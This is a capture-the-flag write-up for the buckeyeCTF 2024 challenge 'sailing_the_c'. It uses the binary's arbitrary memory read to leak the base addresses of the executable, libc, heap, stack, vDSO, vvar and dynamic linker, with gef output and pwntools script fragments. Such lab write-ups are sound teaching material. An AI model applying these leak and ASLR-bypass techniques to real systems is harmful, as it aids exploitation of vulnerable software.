# sailing_the_c

Knowledge about the ELF vaddr space

## checksec

```python
[*] '/mnt/d/CTFs/buckeyeCTF_2024/sailing_the_c/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The only important fact is that there is no PIE and that the base address of the main executable is at `0x400000`. 

## Overview of Binary

`sailing_the_c` is a play on words for sailing the sea (of C), because this challenge requires that we figure out the various base addresses of the segments in the virtual address space of the running process (which is found in `/proc/<pid>/map`, or `/proc/self/map` is a process wants to look at its own vaddr space). 

This validation of base addresses occurs in this chunk of the `report` function

```c
fp = fopen("/proc/self/maps","r");
while(fgets(line, sizeof(line), fp)) {
    line[strcspn(line, "\n")] = 0;
    char *filename = strrchr(line,' ')+1;
    if (line[strlen(line)-1] != ' ' && strcmp(filename,prev)){
        strcpy(prev,filename);
        base = strtoull(strtok(line, "-"), NULL, 16);
        printf("Where in the world is %s?\n",filename);
        scanf("%zu", &response);
        if (response == base){
            puts("Correct!");
        } else {
            puts("It seems you are not worthy of flaghood.");
            exit(1);
        }
    }
}
```

Only if we pass through this chunk without exiting will we hit the `accolade` function, which prints the flag. 

The pain point is that due to ASLR, the base addresses of `[stack]`. `[heap]`, `[vdso]`, libc, etc will different for every run of the executable. 

### Reading from anywhere in the vaddr space

Thankfully, we can read from the process' entire vaddr space in the `sail` function

```c
void *location = 0;
while (1) {
    puts("Where to, captain?");
    scanf("%zu", &location);
    if (!location) { break; }
    printf("Good choice! We gathered %zu gold coins.\n",*(uint64_t *)location);
}
```

which basically treats the string we pass in to be of type `size_t`, then deferences it (i.e. treating it as a pointer) before printing the result to stdout. 

We will use this to obtain the base addresses needed to solve this challenge. 

## Obtaining the various Base Addresses

### Base Address of the Main Executable

The binary has no PIE, so its base address is trivial at `0x400000`. 

### Base Address of libc

The base address of libc can be obtained by first reading the value of an entry in the GOT that has already been resolved to its actual address in libc. 

We know the address of the GOT of the main executable pre-loadtime because the main executable is not position-independent. 

Since we are provided the libc used by the executable, we can simply subtract the offset of that function in [libc.so.6](./libc.so.6) to obtain the base address at which libc was loaded. 

### Base Address of the Heap

We can use some handy functionality in gef to know where in some memory segment (e.g. the main executable, the stack, etc) there is a reference to some other memory segment. 

That functionality is the `scan` command, where the syntax is

```
[!] Syntax
scan HAYSTACK NEEDLE
```

For example, to scan for references to libc in the stack, we would use

```python
gef➤  scan stack libc
[+] Searching for addresses in 'stack' that point to 'libc'
```

In our case, we want to scan for references to the heap from libc just before the point we need to be begin providing input to the binary (just before because we want to mimic the conditions at which we are given arb read as much as possible during the gef scan). 

We specifically are trying to find references to the heap from libc because we know the base address of libc and there are no references to the heap from the main executable (the other segment which base address we know right now). 

So, spinning up gef on `chall`, we set a breakpoint at the `scanf` call in `sail`, and run till we hit the breakpoint

```c
int sail(){
	void *location = 0;
	while (1) {
		puts("Where to, captain?");
		scanf("%zu", &location);
		if (!location) { break; }
		printf("Good choice! We gathered %zu gold coins.\n",*(uint64_t *)location);
	}
	puts("Back home? Hopefully the king will be pleased...");
	sleep(2);
	return 0;
}
```

Then, we scan for references to the heap in libc

```python
gef➤  scan libc heap
[+] Searching for addresses in 'libc' that point to 'heap'
libc.so.6: 0x00007ffff7fac3c0│+0x03c0: 0x0000000000405000  →  0x0000000000000000
libc.so.6: 0x00007ffff7facce0│+0x0ce0: 0x00000000004053a0  →  0x0000000000000000
```

Using gef's `vmmap` command, we get that the heap base addr is exactly `0x405000` for this run of the binary, which corresponds nicely with the first entry. It makes sense that after `malloc` runs, the base address of the heap would be stored somewhere in libc so that subsequent calls can locate the heap. 

We also see from `vmmap` that libc is loaded at the base addr `0x00007ffff7d87000`. We can then calculate the offset in libc at which one of the reference to the heap base addr occurs as shown

```python
libc_offset_ref_to_heapbase = 0x00007ffff7fa13c0 - 0x00007ffff7d87000
```

We then can send `libc_offset_ref_to_heapbase` added to the libc base addr (obtained in [Base Address of libc](#base-address-of-libc)) to the executable, and the output will be the heap base addr. 

```
heap_base_addr = leakfromaddr(libc.address + libc_offset_ref_to_heapbase, r)
```

### Base Address of the Stack

We use the same technique as in [Base Address of the Heap](#base-address-of-the-heap) (but with some modifications) to obtain the base address of the stack. Since the stack grows downwards, when the "base" of the stack is mentioned, I am referring to the largest address of the `[stack]` segment, not the lowest (which I consider to be the "top" of the stack). 

We start by scanning for references to the stack in libc

```python
gef➤  scan libc stack
[+] Searching for addresses in 'libc' that point to 'stack'
libc.so.6: 0x00007ffff7fa2530│+0x1530: 0x00007fffffffe06a  →  0x4853006c6c616863 ("chall"?)
libc.so.6: 0x00007ffff7fa2538│+0x1538: 0x00007fffffffe040  →  "/mnt/d/CTFs/buckeyeCTF_2024/sailing_the_c/chall"
libc.so.6: 0x00007ffff7fa2a20│+0x1a20: 0x00007fffffffddc8  →  0x00007fffffffe040  →  "/mnt/d/CTFs/buckeyeCTF_2024/sailing_the_c/chall"
```

Notice that the third reference is to the pointer to the name of the executable file being run i.e. it is `argv[0]`. While we might attempt to use the offset of the executable name to find out the stack base addr by assuming that it will remain fixed, this assumption does not hold because of possibly different `envp`, `auxv` sizes, etc. 

As an illustration taken from https://articles.manugarg.com/aboutelfauxiliaryvectors (which is for x86 and not x86-64, but it's the same for both), the structure of base of the stack is as shown 

```
position            content                     size (bytes) + comment
  ------------------------------------------------------------------------
  stack pointer ->  [ argc = number of args ]     4
                    [ argv[0] (pointer) ]         4   (program name)
                    [ argv[1] (pointer) ]         4
                    [ argv[..] (pointer) ]        4 * x
                    [ argv[n - 1] (pointer) ]     4
                    [ argv[n] (pointer) ]         4   (= NULL)

                    [ envp[0] (pointer) ]         4
                    [ envp[1] (pointer) ]         4
                    [ envp[..] (pointer) ]        4
                    [ envp[term] (pointer) ]      4   (= NULL)

                    [ auxv[0] (Elf32_auxv_t) ]    8
                    [ auxv[1] (Elf32_auxv_t) ]    8
                    [ auxv[..] (Elf32_auxv_t) ]   8
                    [ auxv[term] (Elf32_auxv_t) ] 8   (= AT_NULL vector)

                    [ padding ]                   0 - 16

                    [ argument ASCIIZ strings ]   >= 0
                    [ environment ASCIIZ str. ]   >= 0

  (0xbffffffc)      [ end marker ]                4   (= NULL)

  (0xc0000000)      < bottom of stack >           0   (virtual)
  ------------------------------------------------------------------------
```

We have the address to `argv[0]`, but don't know how many `envp` and `auxv` there might be. We know that `argc` is almost definitely 1, but to err on the side of caution, we first leak `argc`

```c
libc_offset_ref_to_stack = 0x00007ffff7fada20 - 0x00007ffff7d92000
argc_addr = leakfromaddr(libc.address + libc_offset_ref_to_stack, r) - 8
argc = leakfromaddr(argc_addr, r)
```

and then use that information to jump to `envp[0]`, before go through it until we hit a null pointer that signals the end of `envp`. 

```python
cur_addr = argc_addr + 8*(argc+2) # envp0_addr
while leakfromaddr(cur_addr, r) != 0: # Loop through envp until nullptr is hit
    cur_addr += 8
```

We do the same for `auvx`

```python
cur_addr += 8 # auxv0-addr
while leakfromaddr(cur_addr, r) != 0: # Loop through auxv until nullptr is hit
    cur_addr += 8
```

At this point, we don't really know the legnths of the padding, argument ASCII strings and environment ASCII strings so we just make a good guess that the stack base addr is cur_addr rounded up to the nearest 0x1000 page boundary, plus 0x1000 (which I tested in gdb, although obviously that is not rigorous because `envp` can differ between runs)

```python
stack_base_addr = cur_addr + ((0x1000 - cur_addr % 0x1000) if cur_addr % 0x1000 != 0 else 0)
```

The fact that the end marker exists helps us, for we can keep adding 0x1000 to `stack_base_addr` until it passes the check that the end marker is 0

```python
while leakfromaddr(stack_base_addr - 8, r) != 0:
    stack_base_addr += 0x1000
```

Lastly, we calculate `stack_top_addr` (where that is simply the lowest address of the `[stack]` segment) which is a fixed offset from the base stack addr (I'd be very surprised if there are sufficient `envp` and `auxv`, or that the relevant strings are that long, to require that the stack be expanded). 

> NOTE: EVEN WITH ALL THESE MECHANISMS, THE OBTAINED STACK BASE AND TOP ADDR MAY NOT BE CORRECT. RUNNING THE [SOLVE SCRIPT](./solve.py) A FEW TIMES SHOULD GIVE THE SOLVE

### Base Address of vDSO

The `[vdso]` label in the `/proc/self/map` of the executable refers to the virtual dynamic shared object, which maps the functionality of certain commonly-used syscalls into every process' vaddr space to improve performance (since the going through the full interrupt-handling/syscall process is slow). 

The vDSO also provides a layer of abstraction to the processor's syscall implementations. In essence, rather than require the C library to figure out if certain faster syscall functionality (implemented by newer, more optimized processors which is typically backwards-incompatible) is available at run time, the C library can just use functions provided by the kernel in the vDSO.

According to [this blog post](https://web.archive.org/web/20161122032625/http://www.trilithium.com/johan/2005/08/linux-gate/), 

> A program can determine the location of the shared object in memory by examining an AT_SYSINFO entry in the ELF auxiliary vector. The auxiliary vector (auxv) is an array of pointers passed to new processes in the same way program arguments (argv) and environment variables (envp) are. 

Also, according to a [page in the Linux Kernel Archives](https://www.kernel.org/doc/html/v5.17/x86/elf_auxvec.html#:~:text=AT_SYSINFO%20is%20used%20for%20locating,a%20signal%20to%20user%2Dspace.), 

> AT_SYSINFO is used for locating the vsyscall entry point. It is not exported on 64-bit mode.
>
> AT_SYSINFO_EHDR is the start address of the page containing the vDSO.

So the vDSO base addr is given by an auxilitary vector of type AT_SYSINFO_EHDR. 

Then, according to this [ELF Format cheatsheet](https://gist.github.com/DtxdF/e6d940271e0efca7e0e2977723aec360), the struct for an auxilitary vector entry is

```c
typedef struct
{
    uint64_t a_type;
    union
    {
        uint64_t a_val;
    } a_un;
} Elf64_auxv_t;
```

and the value of `a_type` that we are looking for is 33. 

```c
/* Legal values for a_type (entry type).  */
#define AT_NULL         0               /* End of vector */
#define AT_IGNORE       1               /* Entry should be ignored */
#define AT_EXECFD       2               /* File descriptor of program */
#define AT_PHDR         3               /* Program headers for program */
#define AT_PHENT        4               /* Size of program header entry */
#define AT_PHNUM        5               /* Number of program headers */
#define AT_PAGESZ       6               /* System page size */
#define AT_BASE         7               /* Base address of interpreter */
#define AT_FLAGS        8               /* Flags */
#define AT_ENTRY        9               /* Entry point of program */
#define AT_NOTELF       10              /* Program is not ELF */
#define AT_UID          11              /* Real uid */
#define AT_EUID         12              /* Effective uid */
#define AT_GID          13              /* Real gid */
#define AT_EGID         14              /* Effective gid */
#define AT_CLKTCK       17              /* Frequency of times() */
/* Pointer to the global system page used for system calls and other nice things.  */
#define AT_SYSINFO      32
#define AT_SYSINFO_EHDR 33
```

So we backtrack (I'm not combining this with obtaining the [Base Address of the Stack](#base-address-of-the-stack) for better clarity) from where we stopped previously until we hit the value 33, and take the value at 8 above that address as the vDSO base addr

```python
while leakfromaddr(cur_addr, r) != 33:
    cur_addr -= 8
vdso_base_addr = leakfromaddr(cur_addr+8, r)
```

#### Base Address of vvar

The `[vvar]` label in the `/proc/self/map` of the executable stands for the virtual variables segment, which maps to a page (or a few pages) of kernel data that includes data (usually timing data) for calls such as `gettimeofday()` requiring syscalls. This, like the vDSO, allows for certain simple syscalls to occur significantly faster. 

The vvar base addr is a fixed offset from the vDSO base addr, so it can be easily calculated from the vDSO base addr obtained in [Base Address of vDSO](#base-address-of-vdso). 

### Base Address of the Dynamic Linker (ld)

Using gef's `scan` command to search for references to the dynamic linker segment in the stack, libc, main executable, etc, we see that there are none that point to the ld base addr (we use ld to describe the dynamic linker). 

This means that we will need the offset of the referenced address in the dynamic linker, which depends on the ld distribution. Hence we need to obtain the ld used on the CTF infra's remote server by pulling down the Docker image and extracting its dynamic linker with the following command

```bash
docker run --rm -it -v "$PWD":/app ubuntu@sha256:075680e983398fda61b1ac59ad733ad81d18df4bc46411666bb8a03fb9ea0195
```

The command mounts our current working directory into the `/app` directory of the container so that we can extract the ld used with the command

```bash
cp /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /app
```

and we can patch the local version of the challenge binary to use this ld. 

To obtain the ld base addr, we're going to want to leak a stable address in the ld. From [Part 4 of Ian's 20-part Linker Essay](https://www.airs.com/blog/archives/41), 

> ... The first PLT entry is special, and looks like this:
>
> pushl 4(%ebx)\
> jmp *8(%ebx)
>
> This references the second and third entries in the GOT. The dynamic linker will initialize them to have appropriate values for a callback into the dynamic linker itself. 

Without going into PLT/GOT/dynamic linking shenanigans, we just need to know that the third entry of the `.got.plt` section (i.e. the GOT, try not to worry too much about the sometimes confusing semantics of section names) in the binary is the `_dl_runtime_resolve_xsavec` function in the ld. 

This can be verified with  gef's `scan` - focus on the third reference to ld that exists in the main executable

```python
gef➤  scan /mnt/d/CTFs/buckeyeCTF_2024/sailing_the_c/patched/chall_patched ld
[+] Searching for addresses in '/mnt/d/CTFs/buckeyeCTF_2024/sailing_the_c/patched/chall_patched' that point to 'ld'
chall_patched: 0x00000000003ff460│+0x0460: 0x00007ffff7ffe118  →  0x0000000000000001
chall_patched: 0x0000000000404008│+0x0008: 0x00007ffff7ffe2e0  →  0x0000000000000000
chall_patched: 0x0000000000404010│+0x0010: 0x00007ffff7fd8d30  →  <_dl_runtime_resolve_xsavec+0> endbr64
```

Basically, if you run `readelf -d chall` you will see that the `.got.plt` section is at `0x404000` (once again, I know the readelf output labels it PLTGOT, but just trust me about the naming), so `0x404010 = 0x404000 + 8 * 2` is the third entry of that pointer array

```
$ readelf -d chall

...
0x0000000000000003 (PLTGOT)             0x404000
...
```

Thus, to obtain the ld base addr, we leak the value at 0x404010 (since there is no PIE, the addr of `.got.plt` is fixed) and subtract the appropriate offset. 

```python
ld.address = leakfromaddr(0x404010, r) - (0x00007ffff7fd8d30 - 0x00007ffff7fc3000) # For some reason, ld.symbols._dl_runtime_resolve_xsavec doesn't work - probably pwntools isn't detecting the symbol for some reason
```

## Submitting the Obtained Base Addresses

Finally, we need to submit the obtained base (lowest) addresses in the following order 
1. Main executable
2. Heap
3. libc
4. ld
5. Stack
6. vvar
7. vDSO

This is done with the following loop

```python
report_arr = [0x400000, heap_base_addr, libc.address, ld.address, stack_top_addr, vvar_base_addr, vdso_base_addr]
for report in report_arr:
    r.recvline()
    r.sendline(str(report).encode())
    r.recvline()
```

after which we should be able to get the flag. 

## Caveat about running `solve.py` locally

If there is no `flag.txt` in the `./patched` directory, there will be no output from the script because pwntools' `r.interactive()` does not read stderr. 

## Flag

Did not obtain the flag (solved after the CTF ended)